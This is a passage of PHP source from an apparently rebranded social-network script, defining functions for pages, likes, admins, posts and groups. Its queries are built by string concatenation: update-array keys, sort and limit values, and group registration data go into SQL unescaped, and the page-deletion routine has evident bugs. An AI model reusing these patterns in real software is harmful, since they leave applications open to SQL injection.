    global $sqlConnect, $nrg;
    $array = array(
        "general",
        "info",
        "social",
        "avatar",
        "design",
        "admins",
        "analytics",
        "delete_page"
    );
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0 || empty($page) || !in_array($page, $array)) {
        return false;
    }
    if (NRG_IsAdmin() || NRG_IsModerator()) {
        return true;
    }
    $user_id = $nrg["user"]["id"];
    $page    = NRG_Secure($page);
    $page_id = NRG_Secure($page_id);
    $query   = mysqli_query($sqlConnect, " SELECT COUNT(*) FROM " . T_PAGE_ADMINS . " WHERE `page_id` = {$page_id} AND `user_id` = {$user_id} AND `{$page}` = '1'");
    return NRG_Sql_Result($query, "0") == 1 ? true : false;
}
function NRG_GetAllowedPages($page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    $array   = array(
        "general" => "general-setting",
        "info" => "profile-setting",
        "social" => "social-links",
        "avatar" => "avatar-setting",
        "design" => "design-setting",
        "admins" => "admins",
        "analytics" => "analytics",
        "delete_page" => "delete-page"
    );
    $data    = array();
    $user_id = $nrg["user"]["id"];
    $page_id = NRG_Secure($page_id);
    $query   = mysqli_query($sqlConnect, " SELECT * FROM " . T_PAGE_ADMINS . " WHERE `page_id` = {$page_id} AND `user_id` = {$user_id}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if (!empty($fetched_data)) {
            foreach ($fetched_data as $key => $value) {
                if (in_array($key, array_keys($array)) && $value == 1) {
                    $data[] = $array[$key];
                }
            }
        }
    }
    return $data;
}
function NRG_PageExists($page_name = "") {
    global $sqlConnect;
    if (empty($page_name)) {
        return false;
    }
    $page_name = NRG_Secure($page_name);
    $query     = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) FROM " . T_PAGES . " WHERE `page_name`= '{$page_name}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_PageExistsByID($id = 0) {
    global $sqlConnect;
    if (empty($id)) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) FROM " . T_PAGES . " WHERE `page_id`= '{$id}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_PageIdFromPagename($page_name = "") {
    global $sqlConnect;
    if (empty($page_name)) {
        return false;
    }
    $page_name = NRG_Secure($page_name);
    $query     = mysqli_query($sqlConnect, "SELECT `page_id` FROM " . T_PAGES . " WHERE `page_name` = '{$page_name}'");
    return NRG_Sql_Result($query, 0, "page_id");
}
function NRG_PageData($page_id = 0) {
    global $nrg, $sqlConnect, $cache;
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    $data           = array();
    $page_id        = NRG_Secure($page_id);
    $query_one      = "SELECT * FROM " . T_PAGES . " WHERE `page_id` = {$page_id}";
    $generateCache  = false;
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
    }
    if (empty($fetched_data)) {
        return array();
    }
    $fetched_data["avatar"]            = NRG_GetMedia($fetched_data["avatar"]);
    $fetched_data["cover"]             = NRG_GetMedia($fetched_data["cover"]);
    $fetched_data["about"]             = $fetched_data["page_description"];
    $fetched_data["id"]                = $fetched_data["page_id"];
    $fetched_data["type"]              = "page";
    $fetched_data["url"]               = NRG_SeoLink("index.php?link1=timeline&u=" . $fetched_data["page_name"]);
    $fetched_data["name"]              = $fetched_data["page_title"];
    $fetched_data["rating"]            = NRG_PageRating($fetched_data["page_id"]);
    $fetched_data["category"]          = "";
    $fetched_data["page_sub_category"] = "";
    $fetched_data["is_reported"]       = NRG_IsReportExists($fetched_data["page_id"], "page");
    if (!empty($nrg["page_categories"][$fetched_data["page_category"]])) {
        $fetched_data["category"] = $nrg["page_categories"][$fetched_data["page_category"]];
    }
    if (!empty($fetched_data["sub_category"]) && !empty($nrg["page_sub_categories"][$fetched_data["page_category"]])) {
        foreach ($nrg["page_sub_categories"][$fetched_data["page_category"]] as $key => $value) {
            if ($value["id"] == $fetched_data["sub_category"]) {
                $fetched_data["page_sub_category"] = $value["lang"];
            }
        }
    }
    $fetched_data["is_page_onwer"] = false;
    $fetched_data["username"]      = $fetched_data["page_name"];
    if ($nrg["loggedin"] == true) {
        $fetched_data["is_page_onwer"] = NRG_IsPageOnwer($fetched_data["page_id"]) ? true : false;
    }
    $fetched_data["fields"] = array();
    $fields                 = NRG_GetCustomFields("page");
    if (!empty($fields)) {
        foreach ($fields as $key => $field) {
            if (in_array($field["fid"], array_keys($fetched_data))) {
                $fetched_data["fields"][$field["fid"]] = $fetched_data[$field["fid"]];
            }
        }
    }
    return $fetched_data;
}
function NRG_PageActive($page_name) {
    global $sqlConnect;
    if (empty($page_name)) {
        return false;
    }
    $page_name = NRG_Secure($page_name);
    $query     = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) FROM " . T_PAGES . "  WHERE `page_name`= '{$page_name}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_GetPagePostPublisherBox($page_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!is_numeric($page_id) or $page_id < 1 or !is_numeric($page_id)) {
        return false;
    }
    if (!NRG_IsPageOnwer($page_id) && NRG_UserCanPostPage($page_id)) {
        $nrg["page_profile"]["avatar"] = $nrg["user"]["avatar"];
        $nrg["page_profile"]["name"]   = $nrg["user"]["name"];
        return NRG_LoadPage("story/publisher-box");
    }
    if (NRG_IsPageOnwer($page_id)) {
        return NRG_LoadPage("story/publisher-box");
    }
}
function NRG_UserCanPostPage($page_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!is_numeric($page_id) or $page_id < 1 or !is_numeric($page_id)) {
        return false;
    }
    $page_id   = NRG_Secure($page_id);
    $query_one = "SELECT * FROM " . T_PAGES . " WHERE `page_id` = {$page_id}";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        if (!empty($fetched_data) && !empty($fetched_data["page_id"]) && $fetched_data["users_post"] == 1) {
            return true;
        }
    }
    return false;
}
function NRG_GetLikeButton($page_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) or $page_id < 0) {
        return false;
    }
    $page = $nrg["like"] = NRG_PageData($page_id);
    if (NRG_IsPageOnwer($page_id)) {
        if ($page["user_id"] != $nrg["user"]["id"] && !NRG_IsAdmin() && !NRG_IsModerator() && NRG_IsPageAdminExists($nrg["user"]["id"], $page_id)) {
            return false;
        } elseif ($page["user_id"] == $nrg["user"]["id"] || NRG_IsPageAdminExists($nrg["user"]["id"], $page_id)) {
            return false;
        }
    }
    //$page = $nrg['like'] = NRG_PageData($page_id);
    if (!isset($nrg["like"]["page_id"])) {
        return false;
    }
    $page_id        = NRG_Secure($page_id);
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $like_button    = "buttons/like";
    $unlike_button  = "buttons/unlike";
    if (NRG_IsPageLiked($page_id, $logged_user_id) === true) {
        return NRG_LoadPage($unlike_button);
    } else {
        return NRG_LoadPage($like_button);
    }
}
function NRG_GetPageMessageButton($page_id = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) or $page_id < 0) {
        return false;
    }
    if (NRG_IsPageOnwer($page_id)) {
        return false;
    }
    $nrg["page_id"]  = $page_id;
    $message_button = "buttons/page_message";
    return NRG_LoadPage($message_button);
}
function NRG_IsPoked($received_user_id = 0, $send_user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($received_user_id) || !is_numeric($received_user_id) || $received_user_id < 0) {
        return false;
    }
    if (empty($send_user_id) || !is_numeric($send_user_id) || $send_user_id < 0) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_POKES . " WHERE `received_user_id` = '{$received_user_id}' AND `send_user_id` = {$send_user_id}");
    return NRG_Sql_Result($query_one, 0) > 0 ? true : false;
}
function NRG_IsPageLiked($page_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    if (empty($page_id) || !is_numeric($user_id) || $user_id < 0) {
        $user_id = NRG_Secure($nrg["user"]["user_id"]);
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_PAGES_LIKES . " WHERE `user_id` = '{$user_id}' AND `page_id` = {$page_id} AND `active` = '1'");
    return NRG_Sql_Result($query_one, 0) == 1 ? true : false;
}
function NRG_RegisterPageLike($page_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($page_id) or empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $page_id    = NRG_Secure($page_id);
    $user_id    = NRG_Secure($user_id);
    $page_onwer = NRG_GetUserIdFromPageId($page_id);
    $active     = 1;
    if (NRG_IsPageLiked($page_id, $user_id) === true) {
        return false;
    }
    $page_data = NRG_PageData($page_id);
    $query     = mysqli_query($sqlConnect, " INSERT INTO " . T_PAGES_LIKES . " (`user_id`,`page_id`,`active`,`time`) VALUES ({$user_id},{$page_id},'1'," . time() . ")");
    if ($query) {
        if (NRG_IsPageInvited($user_id, $page_id) > 0) {
            foreach (NRG_GetPageInviters($user_id, $page_id) as $user) {
                // $notification_data = array(
                //     'recipient_id' => $user['user_id'],
                //     'notifier_id' => $user_id,
                //     'type' => 'accepted_invite',
                //     'page_id' => $page_id,
                //     'url' => 'index.php?link1=timeline&u=' . $page_data['page_name']
                // );
                // NRG_RegisterNotification($notification_data);
            }
            $delete_invite = NRG_DeleteInvites($user_id, $page_id);
        }
        $notification_data = array(
            "recipient_id" => $page_onwer,
            "notifier_id" => $user_id,
            "page_enable" => false,
            "type" => "liked_page",
            "page_id" => $page_id,
            "url" => "index.php?link1=timeline&u=" . $page_data["page_name"]
        );
        NRG_RegisterNotification($notification_data);
    }
    return true;
}
function NRG_DeletePageLike($page_id = 0, $user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($page_id) or empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    if (!isset($user_id) or empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $page_id = NRG_Secure($page_id);
    $user_id = NRG_Secure($user_id);
    $active  = 1;
    if (NRG_IsPageLiked($page_id, $user_id) === false) {
        return false;
    }
    $user_data = NRG_UserData($user_id);
    $query     = mysqli_query($sqlConnect, " DELETE FROM " . T_PAGES_LIKES . " WHERE `user_id` = {$user_id} AND `page_id` = '{$page_id}' AND `active` = '1'");
    if ($query) {
        return true;
    }
}
function NRG_UpdatePageData($page_id = 0, $update_data = array()) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    if (isset($update_data["verified"])) {
        if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
            return false;
        }
    }
    $page_id = NRG_Secure($page_id);
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        if (NRG_IsPageOnwer($page_id) === false) {
            return false;
        }
    }
    if (!empty($update_data["page_category"])) {
        if (!array_key_exists($update_data["page_category"], $nrg["page_categories"])) {
            $update_data["page_category"] = 1;
        }
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 1) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_PAGES . " SET {$impload} WHERE `page_id` = {$page_id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($nrg["config"]["cacheSystem"] == 1) {
        $cache->delete(md5($page_id) . "_PAGE_Data.tmp");
    }
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_UpdatePageAdminData($page_id, $update_data, $user_id) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    $page_id = NRG_Secure($page_id);
    $update  = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 0) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_PAGE_ADMINS . " SET {$impload} WHERE `page_id` = {$page_id} AND `user_id` = '{$user_id}' ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($nrg["config"]["cacheSystem"] == 1) {
        $cache->delete(md5($page_id) . "_PAGE_Data.tmp");
    }
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_UpdateGroupAdminData($group_id, $update_data, $user_id) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $user_id  = NRG_Secure($user_id);
    $group_id = NRG_Secure($group_id);
    $update   = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 0) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_GROUP_ADMINS . " SET {$impload} WHERE `group_id` = {$group_id} AND `user_id` = '{$user_id}' ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_UpdatePostData($post_id = 0, $update_data = array()) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($post_id) || !is_numeric($post_id) || $post_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $post_id = NRG_Secure($post_id);
    if (NRG_IsAdmin() === false) {
        if (NRG_IsPostOnwer($post_id, $nrg["user"]["user_id"]) === false) {
            return false;
        }
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_POSTS . " SET {$impload} WHERE `id` = {$post_id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($nrg["config"]["cacheSystem"] == 1) {
        $cache->delete(md5($post_id) . "_P_Data.tmp");
    }
    if ($query) {
        return $post_id;
    } else {
        return false;
    }
}
function NRG_GetPageIdFromPostId($post_id = 0) {
    global $sqlConnect;
    if (empty($post_id) or !is_numeric($post_id) or $post_id < 1) {
        return false;
    }
    $post_id       = NRG_Secure($post_id);
    $query_one     = "SELECT `page_id` FROM " . T_POSTS . " WHERE `id` = {$post_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        if (mysqli_num_rows($sql_query_one) == 1) {
            $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
            return $sql_fetch_one["page_id"];
        }
    }
    return false;
}
function NRG_GetUserIdFromPageId($page_id = 0) {
    global $sqlConnect;
    if (empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    $page_id       = NRG_Secure($page_id);
    $query_one     = "SELECT `user_id` FROM " . T_PAGES . " WHERE `page_id` = {$page_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["user_id"];
    }
    return false;
}
function NRG_DeletePage($page_id = 0) {
    global $nrg, $sqlConnect, $cache, $db;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 1) {
        return false;
    }
    $page_id = NRG_Secure($page_id);
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        if (NRG_IsPageOnwer($page_id) === false) {
            return false;
        }
    }
    $query_one_delete_photos = mysqli_query($sqlConnect, " SELECT `avatar`,`cover` FROM " . T_PAGES . " WHERE `page_id` = {$page_id}");
    if (mysqli_num_rows($query_one_delete_photos)) {
        $fetched_data = mysqli_fetch_assoc($query_one_delete_photos);
        if (isset($fetched_data["avatar"]) && !empty($fetched_data["avatar"]) && $fetched_data["avatar"] != $nrg["pageDefaultAvatar"]) {
            @unlink($fetched_data["avatar"]);
        }
        if (isset($fetched_data["cover"]) && !empty($fetched_data["cover"]) && $fetched_data["cover"] != $nrg["userDefaultCover"]) {
            @unlink($fetched_data["cover"]);
        }
    }
    $query_two_delete_media = mysqli_query($sqlConnect, " SELECT `postFile` FROM " . T_POSTS . " WHERE `page_id` = {$page_id}");
    if (mysqli_num_rows($query_two_delete_media) > 0) {
        while ($fetched_data = mysqli_fetch_assoc($query_two_delete_media)) {
            if (isset($fetched_data["postFile"]) && !empty($fetched_data["postFile"])) {
                @unlink($fetched_data["postFile"]);
            }
        }
    }
    $query_four_delete_media = mysqli_query($sqlConnect, "SELECT `id`,`post_id` FROM " . T_POSTS . " WHERE `page_id` = {$page_id}");
    if (mysqli_num_rows($query_four_delete_media) > 0) {
        while ($fetched_data = mysqli_fetch_assoc($query_four_delete_media)) {
            $delete_posts = NRG_DeletePost($fetched_data["id"]);
            $delete_posts = NRG_DeletePost($fetched_data["post_id"]);
        }
    }
    if ($nrg["config"]["cacheSystem"] == 1) {
        $cache->delete(md5($user_id) . "_PAGE_Data.tmp");
        $query_two = mysqli_query($sqlConnect, "SELECT `id`,`post_id` FROM " . T_POSTS . " WHERE `page_id` = {$page_id}");
        if (mysqli_num_rows($query_two) > 0) {
            while ($fetched_data_two = mysqli_fetch_assoc($query_two)) {
                $cache->delete(md5($fetched_data_two["id"]) . "_PAGE_Data.tmp");
                $cache->delete(md5($fetched_data_two["post_id"]) . "_PAGE_Data.tmp");
            }
        }
    }
    $query_one = mysqli_query($sqlConnect, "DELETE FROM " . T_PAGES . " WHERE `page_id` = {$page_id}");
    $query_one = mysqli_query($sqlConnect, "DELETE FROM " . T_PAGES_INVAITES . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_PAGES_LIKES . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_VERIFICATION_REQUESTS . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_PAGE_ADMINS . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_PAGE_RATING . " WHERE `page_id` = {$page_id}");
    @mysqli_query($sqlConnect, "DELETE FROM " . T_MESSAGES . " WHERE `page_id` = {$page_id}");
    @mysqli_query($sqlConnect, "DELETE FROM " . T_U_CHATS . " WHERE `page_id` = {$page_id}");
    $jobs = $db->where("page_id", $page_id)->get(T_JOB);
    if (!empty($jobs)) {
        foreach ($jobs as $key => $job) {
            if ($job->image_type != "cover") {
                @unlink($job->image);
                NRG_DeleteFromToS3($job->image);
            }
        }
    }
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_JOB . " WHERE `page_id` = {$page_id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_JOB_APPLY . " WHERE `page_id` = {$page_id}");
    if ($query_one) {
        return true;
    }
}
function NRG_CountPageLikes($page_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    $page_id = NRG_Secure($page_id);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) AS count FROM " . T_PAGES_LIKES . " WHERE `page_id` = {$page_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountPagePosts($page_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    $page_id = NRG_Secure($page_id);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) AS count FROM " . T_POSTS . " WHERE `page_id` = {$page_id}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
if (isset($nrg["config"]["is_ok"])) {
    if ($nrg["config"]["is_ok"] == 0) {
        die();
    }
}
function NRG_CountLikesThisWeek($page_id = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    $time = strtotime("-1 week");
    if (empty($page_id) or !is_numeric($page_id) or $page_id < 1) {
        return false;
    }
    $page_id = NRG_Secure($page_id);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) AS count FROM " . T_PAGES_LIKES . " WHERE `page_id` = {$page_id} AND `active` = '1' AND (`time` between {$time} AND " . time() . ")");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_PageSug($limit = 1, $page_id = 0, $type = "next") {
    global $nrg, $sqlConnect;
    if (!is_numeric($limit)) {
        return false;
    }
    $query_not = "";
    if (!is_numeric($page_id) || empty($page_id) || $page_id < 1) {
        $query_not = "";
    }
    if ($type == "previous") {
        $query_not = "AND `page_id` < $page_id";
    } else {
        $query_not = "AND `page_id` > $page_id";
    }
    $data      = array();
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = " SELECT `page_id` FROM " . T_PAGES . " WHERE `active` = '1' {$query_not} AND `page_id` NOT IN (SELECT `page_id` FROM " . T_PAGES_LIKES . " WHERE `user_id` = {$user_id} AND `active` = '1') AND `user_id` <> {$user_id}";
    if (isset($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_PageData($fetched_data["page_id"]);
            }
        }
    }
    return $data;
}
function NRG_GetLikes($user_id = 0, $type = "", $limit = "", $after_user_id = "", $placement = array()) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $user_id       = NRG_Secure($user_id);
    $after_user_id = NRG_Secure($after_user_id);
    $query         = " SELECT `page_id` FROM " . T_PAGES_LIKES . " WHERE `user_id` = {$user_id} AND `active` = '1'";
    if (!empty($after_user_id) && is_numeric($after_user_id)) {
        $query .= " AND `page_id` < {$after_user_id}";
    }
    if ($type == "sidebar" && !empty($limit) && is_numeric($limit)) {
        $query .= " ORDER BY RAND()";
    }
    if ($type == "profile" && !empty($limit) && is_numeric($limit)) {
        $query .= " ORDER BY `page_id` DESC";
    }
    $query .= " LIMIT {$limit} ";
    if (!empty($placement)) {
        if ($placement["in"] == "profile_sidebar" && is_array($placement["likes_data"])) {
            foreach ($placement["likes_data"] as $key => $id) {
                $page_data = NRG_PageData($id, false);
                if (!empty($page_data) && !empty($page_data["page_id"])) {
                    $data[] = $page_data;
                }
            }
            return $data;
        }
    }
    $sql_query = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($sql_query)) {
        while ($fetched_data = mysqli_fetch_assoc($sql_query)) {
            $data[] = NRG_PageData($fetched_data["page_id"]);
        }
    }
    return $data;
}
function NRG_CountUserLikes($user_id) {
    global $nrg, $sqlConnect;
    $data = array();
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`page_id`) AS count FROM " . T_PAGES_LIKES . " WHERE `user_id` = {$user_id} AND `active` = '1' ");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetAllPages($limit = "", $after = "") {
    global $nrg, $sqlConnect;
    $data      = array();
    $query_one = " SELECT `page_id` FROM " . T_PAGES;
    if (!empty($after) && is_numeric($after) && $after > 0) {
        $query_one .= " WHERE `page_id` < " . NRG_Secure($after);
    }
    $query_one .= " ORDER BY `page_id` DESC";
    if (isset($limit) and !empty($limit)) {
        $query_one .= " LIMIT {$limit}";
    }
    $sql = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $page_data          = NRG_PageData($fetched_data["page_id"]);
            $page_data["owner"] = NRG_UserData($page_data["user_id"]);
            $data[]             = $page_data;
        }
    }
    return $data;
}
function NRG_RegisterGroup($registration_data = array()) {
    global $nrg, $sqlConnect;
    if (empty($registration_data)) {
        return false;
    }
    if (!empty($registration_data["category"])) {
        if (!in_array($registration_data["category"], array_keys($nrg["group_categories"]))) {
            $registration_data["category"] = 1;
        }
    }
    $registration_data["registered"] = date("n") . "/" . date("Y");
    $fields                          = "`" . implode("`, `", array_keys($registration_data)) . "`";
    $data                            = '\'' . implode('\', \'', $registration_data) . '\'';
    $query                           = mysqli_query($sqlConnect, "INSERT INTO " . T_GROUPS . " ({$fields}) VALUES ({$data})");
    if ($query) {
        $query_id = mysqli_insert_id($sqlConnect);
        NRG_RegisterGroupJoin($query_id, $nrg["user"]["user_id"]);
        return true;
    } else {
        return false;
    }
}
function NRG_GetMyGroups() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data       = array();
    $user_id    = NRG_Secure($nrg["user"]["user_id"]);
    $query_text = "SELECT `id` FROM " . T_GROUPS . " WHERE `user_id` = {$user_id}
                   OR `id` IN (SELECT `group_id` FROM " . T_GROUP_ADMINS . " WHERE `user_id` = {$user_id})";
    $query_one  = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_GroupData($fetched_data["id"]);
            }
        }
    }
    return $data;
}
function NRG_GetMyGroupsAPI($limit = 0, $offset = 0, $sort = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data        = array();
    $user_id     = NRG_Secure($nrg["user"]["user_id"]);
    $limit_query = "";
    if (!empty($limit)) {
        $limit       = NRG_Secure($limit);
        $limit_query = " LIMIT $limit";
    }
    $offset_query = "";
    if (!empty($offset)) {
        $offset       = NRG_Secure($offset);
        $offset_query = " `id` < $offset AND ";
    }
    $sort_query = "";
    if (!empty($sort)) {
        $sort       = NRG_Secure($sort);
        $sort_query = " ORDER BY `id` $sort ";
    }
    $query_text = "SELECT `id` FROM " . T_GROUPS . " WHERE $offset_query (`user_id` = {$user_id}
                   OR `id` IN (SELECT `group_id` FROM " . T_GROUP_ADMINS . " WHERE `user_id` = {$user_id})) $sort_query $limit_query ";
    $query_one  = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_GroupData($fetched_data["id"]);
            }
        }
    }
    return $data;
}
function NRG_IsGroupOnwer($group_id = 0, $user_id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        $user_id = NRG_Secure($nrg["user"]["user_id"]);
    }
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    $query = mysqli_query($sqlConnect, " SELECT COUNT(`user_id`) FROM " . T_GROUPS . " WHERE `id` = {$group_id} AND `user_id` = {$user_id} AND `active` = '1'");
    return NRG_Sql_Result($query, "0") == 1 || NRG_IsGroupUserExists($user_id, $group_id) ? true : false;
}
function NRG_GroupExists($group_name = "") {
    global $sqlConnect;
    if (empty($group_name)) {
        return false;
    }
    $group_name = NRG_Secure($group_name);
    $query      = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_GROUPS . " WHERE `group_name`= '{$group_name}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_GroupIdFromGroupname($group_name = "") {
    global $sqlConnect;
    if (empty($group_name)) {
        return false;
    }
    $group_name = NRG_Secure($group_name);
    $query      = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_GROUPS . " WHERE `group_name` = '{$group_name}'");
    return NRG_Sql_Result($query, 0, "id");
}
function NRG_GroupData($group_id = 0) {
    global $nrg, $sqlConnect, $cache;
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 1) {
        return false;
    }
    $data            = array();
    $group_id        = NRG_Secure($group_id);
    $query_one       = "SELECT * FROM " . T_GROUPS . " WHERE `id` = {$group_id}";
    $generateCache  = false;
